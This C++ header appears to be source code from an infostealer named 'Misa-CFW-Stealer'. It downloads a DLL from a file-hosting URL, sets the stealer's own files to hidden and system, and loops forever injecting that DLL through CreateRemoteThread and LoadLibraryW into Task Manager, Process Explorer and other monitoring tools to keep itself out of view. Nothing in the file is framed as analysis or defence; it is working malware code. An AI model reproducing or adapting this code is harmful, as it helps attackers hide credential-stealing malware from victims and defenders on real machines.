#pragma once

#include <psapi.h> 
#include <tlhelp32.h>
#include <wchar.h>
#include <string>

const char* dll_url = "https://files.catbox.moe/8d6gbn.dll";
const char* filePath = "8d6gbn.dll";

static class process {
public:

	static auto hide_process() -> void {

		util::download_file(dll_url, filePath);

		if (!process::setFileHide("Misa-CFW-Stealer.exe")) {
			std::cout << hue::red << "[!] " << hue::grey << "Failed To Hide Misa-CFW File!" << std::endl;
		}

		if (!process::setFileHide("8d6gbn.dll")) {
			std::cout << hue::red << "[!] " << hue::grey << "Failed To Hide Process DLL File!" << std::endl;
		}

		for (;;)
		{

			const WCHAR* processes[] = {
			   L"Taskmgr.exe",
			   L"ProcessHacker.exe",
			   L"SystemExplorer.exe",
			   L"procexp.exe",
			   L"ProcessLasso.exe",
			   L"AnVir.exe",
			   L"procexp.exe",
			   L"procexp64.exe",
			   L"procexp64a.exe",
			   L"SecurityTaskManager.exe",
			   L"WiseSystemMonitor.exe",
			   L"Rainmeter.exe"
			};

			for (const WCHAR* process : processes) {
				process::hide_from_process(process, false);
			}

			Sleep(1);
		}

	}

	static auto hide_from_process(const WCHAR* TARGET_PROCESS, bool print) -> bool {
		DWORD vicPID = process::pidof(TARGET_PROCESS);
		if (print)
		{
			printf("target PID: %d\n", vicPID);
		}
		HANDLE visProcess = OpenProcess(PROCESS_ALL_ACCESS | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, vicPID);
		if (visProcess == NULL) {
			if (print)
			{
				return false;
			}
		}

		int len = MultiByteToWideChar(CP_UTF8, 0, filePath, -1, NULL, 0);
		WCHAR* path_dll = new WCHAR[len];
		MultiByteToWideChar(CP_UTF8, 0, filePath, -1, path_dll, len);

		WCHAR fullDllPath[MAX_PATH];
		DWORD pathLen = GetFullPathNameW(path_dll, MAX_PATH, fullDllPath, NULL);

		if (isDllInjected(visProcess, fullDllPath)) {
			CloseHandle(visProcess);
		}

		if (!process::injectDll(visProcess, fullDllPath)) {
			if (print)
			{
				return false;
			}
		}

		CloseHandle(visProcess);

		return true;
	}

	static BOOL setFileHide(LPCSTR filepath) {
		return SetFileAttributesA(filepath, FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);
	}

	static BOOL setFileHide(LPCWSTR filepath) {
		return SetFileAttributesW(filepath, FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);
	}


private:

	static auto isDllInjected(HANDLE hProcess, const WCHAR* dllPath) -> BOOL {
		HMODULE hMods[1024];
		DWORD cbNeeded;
		WCHAR szModName[MAX_PATH];

		if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
			for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
				if (GetModuleFileNameExW(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(WCHAR))) {
					if (wcscmp(szModName, dllPath) == 0) {
						return TRUE; //already injected
					}
				}
			}
		}
		return FALSE; //not injected
	}
	static auto pidof(const WCHAR* processImage) -> DWORD
	{
		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		DWORD pid = NULL;
		if (hSnapshot != INVALID_HANDLE_VALUE)
		{
			PROCESSENTRY32W pe32;
			pe32.dwSize = sizeof(PROCESSENTRY32W);
			if (Process32FirstW(hSnapshot, &pe32))
			{
				do {
					if (!wcscmp(processImage, pe32.szExeFile))
					{
						pid = pe32.th32ProcessID;
						break;
					}
				} while (Process32NextW(hSnapshot, &pe32));
			}
			CloseHandle(hSnapshot);
		}
		return pid;
	}
	static auto injectData(HANDLE hProcess, PVOID pLocalData, SIZE_T dataSize) -> PVOID
	{
		PVOID pRemoteData = (PVOID)VirtualAllocEx(
			hProcess,
			NULL,
			dataSize,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_READWRITE
		);
		if (pRemoteData == NULL)
		{
			return NULL;
		}
		SIZE_T bytesWritten;
		BOOL success = WriteProcessMemory(hProcess, pRemoteData, pLocalData, dataSize, &bytesWritten);
		if (!success || bytesWritten != dataSize)
		{
			VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
			return NULL;
		}
		return pRemoteData;
	}
	static auto injectDll(HANDLE hProcess, WCHAR* fullDllPath) -> BOOL
	{
		HMODULE hKernel32 = GetModuleHandleW(L"Kernel32.dll");
		if (!hKernel32)
			return FALSE;
		PVOID pLoadLibrary = (PVOID)GetProcAddress(hKernel32, "LoadLibraryW");

		// +1 because the len doesn't include the terminating null character
		PVOID pRemotePath = injectData(hProcess, fullDllPath, (wcslen(fullDllPath) + 1) * sizeof(WCHAR));
		if (!pRemotePath)
			return FALSE;

		HANDLE hThread = CreateRemoteThread(
			hProcess,
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)pLoadLibrary,
			pRemotePath,
			0,
			NULL);
		if (!hThread)
		{
			VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
			return FALSE;
		}
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
		return TRUE;
	}
};
